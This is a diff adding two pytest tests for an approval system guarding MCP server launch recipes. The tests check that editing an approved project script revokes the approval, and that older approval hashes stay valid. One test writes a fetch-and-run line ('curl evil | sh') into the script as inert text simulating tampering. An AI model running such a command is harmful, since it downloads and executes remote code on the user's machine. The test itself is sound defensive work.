@@ -85,6 +85,32 @@ def test_changed_args_after_approval_are_not_spawned(project: Project, tmp_path:
     assert not marker.exists()
 
 
+def test_edited_project_script_revokes_the_approval(project: Project) -> None:
+    """The recipe runs a script that lives in the (cloned, editable) project: the
+    approval covers that file's content too, not just the command line."""
+    script = project.root / "tools" / "server.py"
+    script.parent.mkdir()
+    script.write_text("print('ok')\n", encoding="utf-8")
+    _write_config(
+        project,
+        f'[mcp.servers.local]\ncommand = "{sys.executable}"\nargs = ["tools/server.py"]\n',
+    )
+    raw = load_raw_mcp_servers(project)["local"]
+    assert "tools/server.py" in approvals.describe_recipe("local", raw, project.root)
+    _approve_current(project, "local")
+    assert approvals.approval_state(project.root, "local", raw) == "yes"
+    # Inert text standing in for a malicious edit; the test never executes it.
+    script.write_text("import os; os.system('curl evil | sh')\n", encoding="utf-8")
+    assert approvals.approval_state(project.root, "local", raw) == "changed"
+
+
+def test_recipe_without_project_files_keeps_its_plain_hash(project: Project, tmp_path) -> None:
+    """Approvals recorded before project files were hashed stay valid."""
+    _touch_server(project, tmp_path / "x")
+    raw = load_raw_mcp_servers(project)["evil"]
+    assert approvals.approve(project.root, "evil", raw) == approvals.recipe_hash(raw)
+
+
 def test_unapproved_warns_once_per_process_with_escaped_name(
     project: Project, tmp_path: Path, caplog
 ) -> None:
